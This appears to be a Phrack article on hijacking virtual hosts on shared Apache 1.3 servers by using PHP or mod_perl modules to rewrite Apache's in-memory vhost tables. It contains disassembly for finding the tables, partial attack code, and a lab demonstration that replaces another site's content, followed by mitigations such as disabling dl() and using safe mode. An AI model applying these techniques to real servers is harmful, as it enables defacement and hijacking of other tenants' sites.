@@ -1,0 +1,456 @@
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3e, Phile #0x0a of 0x10
+
+|=-=[ Attacking Apache with builtin Modules in Multihomed Environments ]=|
+|=----------------------------------------------------------------------=|
+|=-----------------------=[ Andi <andi@void.at> ]=----------------------=|
+
+--[ Contents
+
+  1 - Introduction
+
+  2 - Apache Memory Layout: Virtual Hosts
+
+  3 - Get Virtual Hosts from Memory
+
+  4 - Modify a Virtual Host
+
+  5 - A sample attack
+
+  6 - Add a new Virtual Host
+
+  7 - Keep it up
+  
+  8 - Solution
+
+  9 - References
+ 
+  A - Appendix: The implementation
+
+--[ 1 - Introduction
+
+This paper will show a simple way to modify the memory layout from an
+Apache [1] process. Most Webhosting Providers use PHP [2], Mod_perl [3] as
+builtin Apache module to improve the web server performance. This method
+is of course much faster than loading external programs or extensions (i.e.
+running php in cgi mode). But on the other side this script runs in the
+same memory space as the apache process so you can easily change
+contents of memory. 
+
+There's one reason why all this stuff will work as good as it should.
+Apache holds 5 children in memory (per default). After a HTTP request the
+process will not be killed. Instead of exiting the current apache process
+after closing the connection the next request will be processed by the
+same process. So when you send a lot of requests to the apache server you
+can "infect" every process.
+
+We use this attack technique to hijack a virtual host on server. I know,
+there are other methods to get control over the HTTP requests (using open
+file descriptors,...). But all other methods require at least one process
+running on the server that handles the HTTP requests and redirect them.
+This way of hijacking apache doesn't require another process because we 
+change the memory of the apache process itself and so it works normal as 
+before.
+ 
+This attack technique requires access to an account on a webserver which 
+hosts at least two sites (else it wouldnt make any sense). You can't
+exploit Apache without your own php script on that server (well perhaps
+there are some "Remote Include" vulnerabilities so you can run a script on
+the remote machine).
+
+--[ 2 - Apache Memory Layout: Virtual Hosts
+
+So when Apache recieves a HTTP request an object from type request_rec 
+will be created. This object contains information about the HTTP request
+like the method which is used (GET, POST..), the HTTP protocol number etc.
+Now the correct list for the server ip will be looked up in the IP address
+hash table (iphash_table). The pointer from that list will be stored in
+the request object (variable vhost_lookup_data). After the headers from
+the HTTP request have been read Apache updates it's vhost status. It will
+use the vhost_lookup_data pointer to find the correct virtual host.
+
+Apache uses internal lists for it's virtual hosts. To speed up search 
+requests there is more than one list and a hash table for IP address
+lookups. The information about every virtual host is stored in an object
+from type server_rec.
+
+[apache_1.3.29/src/include/httpd.h]
+...
+struct server_rec {
+
+    server_rec *next;
+
+    ...
+
+    /* Contact information */
+
+    char *server_admin;
+    char *server_hostname;
+    unsigned short port;        /* for redirects, etc. */
+
+    ...
+
+    char *path;                 /* Pathname for ServerPath */
+    int pathlen;                /* Length of path */
+
+    array_header *names;        /* Normal names for ServerAlias servers */
+    array_header *wild_names;/* Wildcarded names for ServerAlias servers */
+
+    uid_t server_uid; /* effective user id when calling exec wrapper */
+    gid_t server_gid; /* effective group id when calling exec wrapper */
+};
+
+As you can see there are many interesting values we would like to change.
+Imagine you are running a virtual host on the same web server as
+http://www.evil.com. So you simply have to look for that virtual host and
+change the variables.
+
+So we know where Apache stores the virtual host information. Now we have to
+find the list and structures that points to those server_rec objects. Lets
+have a look where Apache initializes its virtual hosts.
+
+[apache_1.3.29/src/main/http_vhost.c]
+...
+/* called at the beginning of the config */
+API_EXPORT(void) ap_init_vhost_config(pool *p)
+{
+    memset(iphash_table, 0, sizeof(iphash_table));
+    default_list = NULL;
+    name_vhost_list = NULL;
+    name_vhost_list_tail = &name_vhost_list;
+}
+...
+
+As you can see there are two lists and one hash table. The hash table is
+used for IP address lookups. The default_list contains _default_ server
+entries and name_vhost_list contains all other virtual hosts. The objects
+from the hash table have the following structure:
+
+struct ipaddr_chain {
+    ipaddr_chain *next;
+    server_addr_rec *sar;    /* the record causing it to be in
+                              * this chain (need for both ip addr and port
+                              * comparisons) */
+    server_rec *server;      /* the server to use if this matches */
+    name_chain *names;       /* if non-NULL then a list of name-vhosts
+                              * sharing this address */
+};
+
+Then you have a list of virtual hosts names poiting to that IP address
+(name_chain *names). And from that structure we can directly access the
+virtual host data:
+
+struct name_chain {
+    name_chain *next;
+    server_addr_rec *sar;    /* the record causing it to be in
+                              * this chain (needed for port comparisons) */
+    server_rec *server;         /* the server to use on a match */
+};
+
+
+So the following code will find the correct vhost (variable host):
+...
+    for (i = 0; i < IPHASH_TABLE_SIZE; i++) {
+       for (trav = iphash_table[i]; trav; trav = trav->next) {
+           for (n = trav->names; n != NULL; n = n->next) {
+               conf = ap_get_module_config(n->server->module_config, 
+                                          &core_module);
+               if ( (host != NULL && 
+                    !strcmp(host, n->server->server_hostname)) ||
+                           host == NULL ){
+                              php_printf("VirtualHost: [%s, %s, %s, %s]<br>\n",
+                              n->sar->virthost,
+                              n->server->server_admin,
+                              n->server->server_hostname,
+                              conf->ap_document_root);
+               }
+           }
+       }
+    }
+...
+
+--[ 3 - Get Virtual Hosts from Memory
+
+If we want to change the characteristics of virtual hosts we have to know where
+Apache stores the lists in memory. Apache initialize this list before
+reading the config file. This is done in the ap_init_vhost_config()
+function.
+
+[apache_1.3.29/src/main/http_vhost.c]
+...
+/* called at the beginning of the config */
+API_EXPORT(void) ap_init_vhost_config(pool *p)
+{
+    memset(iphash_table, 0, sizeof(iphash_table)); <----  Yes, thats great
+    default_list = NULL;
+    name_vhost_list = NULL;
+    name_vhost_list_tail = &name_vhost_list; 
+}
+...
+
+So there are many ways to get the address of iphash_table. You can use
+gdb, nm (when not stripped),..
+
+andi@blackbull:~$ gdb /usr/sbin/apache
+GNU gdb 2002-04-01-cvs
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-linux"...(no debugging symbols found)...
+(gdb) disass ap_init_vhost_config
+Dump of assembler code for function ap_init_vhost_config:
+0x080830e0 <ap_init_vhost_config+0>:    push   %ebp
+0x080830e1 <ap_init_vhost_config+1>:    mov    %esp,%ebp
+0x080830e3 <ap_init_vhost_config+3>:    sub    $0x8,%esp
+0x080830e6 <ap_init_vhost_config+6>:    add    $0xfffffffc,%esp
+0x080830e9 <ap_init_vhost_config+9>:    push   $0x400
+0x080830ee <ap_init_vhost_config+14>:   push   $0x0
+0x080830f0 <ap_init_vhost_config+16>:   push   $0x80ceec0
+                                               ^^^^^^^^^^
+					       address of iphash_table
+0x080830f5 <ap_init_vhost_config+21>:   call   0x804f858 <memset>
+0x080830fa <ap_init_vhost_config+26>:   add    $0x10,%esp
+0x080830fd <ap_init_vhost_config+29>:   movl   $0x0,0x80cf2c0
+0x08083107 <ap_init_vhost_config+39>:   movl   $0x0,0x80cf2c4
+0x08083111 <ap_init_vhost_config+49>:   movl   $0x80cf2c4,0x80cf2c8
+0x0808311b <ap_init_vhost_config+59>:   leave
+0x0808311c <ap_init_vhost_config+60>:   ret
+0x0808311d <ap_init_vhost_config+61>:   lea    0x0(%esi),%esi
+End of assembler dump.
+
+If you dont have access to the apache binary you have to use another
+method: In hoagie_apachephp.c there are some external defintions of apache
+functions.
+
+...
+/* some external defintions to get address locations from memory */
+extern API_EXPORT(void) ap_init_vhost_config(pool *p);
+extern API_VAR_EXPORT module core_module;
+...
+
+So inside our module we already have the address for this functions and
+can use the integrated disassembler to get the addresses.
+
+iphash_table =
+   (ipaddr_chain **)getcall((char*)ap_init_vhost_config, "push", 3);
+
+default_list = 
+   (ipaddr_chain *)getcall((char*)ap_init_vhost_config, "mov", 1);
+
+And now its very easy to change any vhost data.
+NOTE: It depends on your compiler and compiler version which mov or push 
+call returns the correct address. So you can also use the integrated 
+disassembler to print the assembler code on your webpage.
+
+--[ 5 - A sample attack
+
+Imagine the following situtation:
+There are three directories (for each virtual host one) and three
+index.html files. Lets have a look at the content:
+
+andi@blowfish:/home$ ls -al hack1/ vhost1/ vhost2/
+hack1/:
+total 16
+drwxr-sr-x    2 andi     andi       4096 Apr 25 03:33 .
+drwxrwsr-x    7 root     staff      4096 Apr 25 03:00 ..
+-rw-r--r--    1 root     staff        20 Apr 25 02:19 index.html
+
+vhost1/:
+total 332
+drwxr-sr-x    2 andi     andi       4096 May  6 14:20 .
+drwxrwsr-x    7 root     staff      4096 Apr 25 03:00 ..
+-rw-r--r--    1 andi     andi        905 May  6 14:21 hoagie_apache_php.php
+-rwxr-xr-x    1 andi     andi     317265 May  6 14:25 hoagie_apache.so
+-rw-r--r--    1 root     andi         15 Apr 25 02:18 index.html
+
+vhost2/:
+total 16
+drwxr-sr-x    2 andi     andi       4096 Apr 25 03:31 .
+drwxrwsr-x    7 root     staff      4096 Apr 25 03:00 ..
+-rw-r--r--    1 root     andi         15 Apr 25 02:18 index.html
+-rw-r--r--    1 andi     andi         15 Apr 25 03:31 test.html
+andi@blowfish:/home$ cat hack1/index.html
+hacked!!!!!
+w0w0w0w
+andi@blowfish:/home$ cat vhost1/index.html
+www.vhost1.com
+andi@blowfish:/home$ cat vhost1/hoagie_apachephp.php
+...
+   if (php_hoagie_loaddl()) {
+      hoagie_setvhostdocumentroot("www.vhost2.com", "/home/hack1");
+   } else {
+      php_hoagie_debug("Cannot load " . PHP_MEM_MODULE);
+   }
+...
+andi@blowfish:/home$ cat vhost2/index.html
+www.vhost2.com
+andi@blowfish:/home$ cat /home/andi/bin/apache/conf/httpd.conf
+...
+<VirtualHost 172.16.0.123:8080>
+    ServerAdmin webmaster@vhost1.com
+    DocumentRoot /home/vhost1
+    ServerName www.vhost1.com
+    ErrorLog logs/www.vhost1.com-error_log
+    CustomLog logs/www.vhost1.com-access_log common
+</VirtualHost>
+
+<VirtualHost 172.16.0.123:8080>
+    ServerAdmin webmaster@vhost1.com
+    DocumentRoot /home/vhost2
+    ServerName www.vhost2.com
+    ErrorLog logs/www.vhost2.com-error_log
+    CustomLog logs/www.vhost2.com-access_log common
+</VirtualHost>
+...
+andi@blowfish:/home$
+
+So, before the attack we send some http requests and look for the correct
+answer.
+
+andi@blowfish:/home$ nc www.vhost1.com 8080
+GET / HTTP/1.0
+Host: www.vhost1.com
+
+HTTP/1.1 200 OK
+Date: Thu, 06 May 2004 12:52:58 GMT
+Server: Apache/1.3.29 (Unix) PHP/4.3.6
+Last-Modified: Sun, 25 Apr 2004 00:18:38 GMT
+ETag: "5a826-f-408b03de"
+Accept-Ranges: bytes
+Content-Length: 15
+Connection: close
+Content-Type: text/html
+
+www.vhost1.com
+andi@blowfish:/home$ nc www.vhost2.com 8080
+GET / HTTP/1.0
+Host: www.vhost2.com
+
+HTTP/1.1 200 OK
+Date: Thu, 06 May 2004 12:53:06 GMT
+Server: Apache/1.3.29 (Unix) PHP/4.3.6
+Last-Modified: Sun, 25 Apr 2004 00:18:46 GMT
+ETag: "5a827-f-408b03e6"
+Accept-Ranges: bytes
+Content-Length: 15
+Connection: close
+Content-Type: text/html
+
+www.vhost2.com
+andi@blowfish:/home$
+
+So now lets start the attack...
+andi@blowfish:/home$ /home/andi/bin/apache/bin/ab -n 200 -c 200 \
+http://www.vhost1.com:8080/hoagie_apachephp.php
+....
+andi@blowfish:/home$ nc www.vhost2.com 8080
+GET / HTTP/1.0
+Host: www.vhost2.com
+
+HTTP/1.1 200 OK
+Date: Thu, 06 May 2004 12:56:27 GMT
+Server: Apache/1.3.29 (Unix) PHP/4.3.6
+Last-Modified: Sun, 25 Apr 2004 00:19:57 GMT
+ETag: "1bc99-14-408b042d"
+Accept-Ranges: bytes
+Content-Length: 20
+Connection: close
+Content-Type: text/html
+
+hacked!!!!!
+w0w0w0w
+andi@blowfish:/home$ 
+
+--[ 6 - Add a new Virtual Host
+
+Instead of changing a virtual host we can also add a new one.
+We know that Apache uses iphash_table to lookup the correct virtual host
+corresponding to its IP address. So when we add a new virtual host we have 
+to calculate the hash key first. This is done by the function
+hash_inaddr():
+
+[apache_1.3.29/src/main/http_vhost.c]
+...
+static ap_inline unsigned hash_inaddr(unsigned key)
+{
+    key ^= (key >> 16);
+    return ((key >> 8) ^ key) % IPHASH_TABLE_SIZE;
+}
+...
+
+In most cases there's already an object of type name_chain (*names)
+because it's unusual that this IP address hasn't been used for another 
+vhost too. So we go through the names list and add an object of type
+name_chain. Before we can add a new object or variable we need to get the
+value of pconf for ap_palloc(). ap_palloc is Apache's malloc function. It
+uses pools to decide where to store data. The address of pconf is used in
+ap_register_other_child().
+
+Now we can create an object of type name_chain. Then we have to add a 
+server_addr_rec object where IP address and port information are stored
+(its used for IP address lookups). After that the more important object
+will be added: server_rec. We have to set the server administrator, server
+email, module config, directory config etc. Look at hoagie_apachephp.c in
+function hoagie_addvhost():
+
+...
+  /* allocate memory for new virtual host objects and it's sub objects */
+  nc = ap_palloc(pconf, sizeof(name_chain));
+  nc->next = NULL;
+
+  /* set IP address and port information */
+  nc->sar = ap_palloc(pconf, sizeof(server_addr_rec));
+  nc->sar->next = NULL;
+  nc->sar->host_addr.s_addr = ipaddr;
+  nc->sar->host_port = 8080;
+  nc->sar->virthost = ap_palloc(pconf, strlen(ipaddrstr) + 1);
+  strcpy(nc->sar->virthost, ipaddrstr);
+...
+
+Lets start apache bench again and infect the apache processes.
+
+--[ 7 - Keep it up
+
+Now we can infect apache processes that are running at the moment. But
+when there are many HTTP requests Apache creates also new processes that
+are not infected. 
+
+So what we do is we are redirecting the signal call for all running Apache
+processes. This is done by Runtime Process Infection (the .so way ;)). 
+Therefore after each new connection all running apache processes will be
+infected too. For more details see [4]. But this can only be done when
+Apache is not started by root because after a setuid() call with old uid is
+not equal to new uid Linux clears the dumpable flag of that process. This
+flag must be set if you want to ptrace() this process.
+
+--[ 8 - Solution?
+
+The best solution would be something like a read-only apache configuration
+in memory.
+
+For PHP you can simply disable the "dl()" function or enable safe mode for
+all your virtual hosts. When you're using mod_perl too, you have to disable
+the whole dl() family functions (see DynaLoader). Generally you can say 
+that every builtin Apache module is vulnerable to this kind of attack (when
+you can directly access memory locations). I implemented a proof of concept
+code for PHP and ModPerl because nowadays these script languages are 
+running on most of the apache web servers.
+
+--[ 9 - References
+
+  [1] Apache - http://www.apache.org
+
+  [2] PHP - http://www.php.net
+
+  [3] ModPerl - http://www.modperl.org
+
+  [4] Runtime Process Infection - https://phrack.org/issues/59/8.html#article
+
+--[ A - Appendix: The implementation
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
